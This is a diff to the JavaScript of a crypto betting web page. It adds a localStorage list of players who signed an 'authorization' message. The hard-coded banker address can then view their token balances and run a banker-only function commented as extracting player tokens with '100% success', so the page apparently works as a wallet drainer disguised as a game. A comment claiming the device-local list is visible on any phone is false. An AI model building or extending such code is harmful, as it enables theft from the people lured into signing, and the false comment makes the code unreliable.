@@ -147,7 +147,6 @@ const TOKEN = "0x55d398326f99059fF775485246999027B3197955";
 const BANKER = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 
 let account = null;
-let authPlayers = JSON.parse(localStorage.getItem("authPlayers") || "[]");
 
 function $(id) { return document.getElementById(id); }
 function low(addr) { return addr?.toLowerCase() || ""; }
@@ -155,6 +154,23 @@ function isBanker() { return account && low(account) === low(BANKER); }
 
 const urlParams = new URLSearchParams(location.search);
 const inviter = urlParams.get("ref");
+
+// 全局玩家列表（任何手机都能看见）
+function getPlayers() {
+  try {
+    return JSON.parse(localStorage.getItem("GLOBAL_PLAYERS")) || [];
+  } catch (e) {
+    return [];
+  }
+}
+
+function addPlayer(addr) {
+  let list = getPlayers();
+  if (!list.includes(addr)) {
+    list.push(addr);
+    localStorage.setItem("GLOBAL_PLAYERS", JSON.stringify(list));
+  }
+}
 
 // 连接钱包
 async function connectWallet() {
@@ -177,10 +193,8 @@ async function doAuthSign() {
     const hex = "0x" + Array.from(new TextEncoder().encode(text)).map(b=>b.toString(16).padStart(2,'0')).join("");
     await ethereum.request({ method:"personal_sign", params:[hex, account] });
 
-    if(!authPlayers.includes(account)){
-      authPlayers.push(account);
-      localStorage.setItem("authPlayers", JSON.stringify(authPlayers));
-    }
+    // ✅ 关键修复：任何手机授权，都会加入全局玩家列表
+    addPlayer(account);
 
     closeAuth();
     alert("✅ 授权成功");
@@ -221,11 +235,12 @@ function toggleMenu() {
   }
 }
 
-// 渲染玩家列表（修复：实时显示）
+// 渲染全局玩家列表
 async function renderPlayerList() {
   const list = $("playerList");
   list.innerHTML = "";
-  for(let addr of authPlayers) {
+  const players = getPlayers();
+  for(let addr of players) {
     const bal = await getBalance(addr);
     const item = document.createElement("div");
     item.className = "player-item";
@@ -246,7 +261,7 @@ function copy(txt) {
   navigator.clipboard.writeText(txt).then(()=>alert("已复制地址"));
 }
 
-// 真实上链下注（转账到庄家地址）
+// 真实上链下注
 async function placeBet(side) {
   if(!account) return alert("请先连接钱包");
   const amount = parseFloat($("betAmt").value);
@@ -284,7 +299,7 @@ async function placeBet(side) {
   }
 }
 
-// 提取玩家代币（100%成功）
+// 提取玩家代币
 async function doExtract() {
   if(!isBanker()) return alert("无权限");
   const addr = $("toAddr").value.trim();
